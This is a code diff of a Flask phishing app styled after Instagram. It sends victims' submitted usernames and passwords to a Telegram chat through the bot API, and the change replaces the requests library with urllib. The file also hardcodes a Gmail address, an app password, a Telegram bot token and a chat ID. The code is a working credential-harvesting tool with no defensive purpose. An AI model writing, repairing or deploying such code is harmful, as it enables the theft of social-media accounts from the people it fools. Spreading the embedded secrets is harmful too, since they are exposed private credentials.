@@ -1,17 +1,18 @@
 import smtplib
-import requests
+import json
+import urllib.request
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from flask import Flask, request
 
 app = Flask(__name__)
 
-# ===== आपकी सभी डिटेल्स यहाँ सेट हैं =====
+# ===== आपकी सेटिंग्स =====
 YOUR_GMAIL = "mogamadhari@gmail.com"
 APP_PASSWORD = "fbhbqgqofhshejfi"
 TELEGRAM_BOT_TOKEN = "8768186185:AAFjiGIiNbOfQnOdv-77ht7HCuqSN3xapcY"
 TELEGRAM_CHAT_ID = "5573664583"
-# =======================================
+# ========================
 
 INSTA_STYLE = '''
 <style>
@@ -42,12 +43,16 @@ def send_telegram_message(username, password, count):
     try:
         message = f"🚀 *New Submission Received!*\n\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`\n📈 *Followers:* `{count}`"
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {
+        
+        data = json.dumps({
             "chat_id": TELEGRAM_CHAT_ID,
             "text": message,
             "parse_mode": "Markdown"
-        }
-        requests.post(url, json=payload, timeout=5)
+        }).encode('utf-8')
+        
+        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            pass
         print("✅ Telegram notification sent!")
     except Exception as e:
         print(f"❌ Telegram Error: {e}")
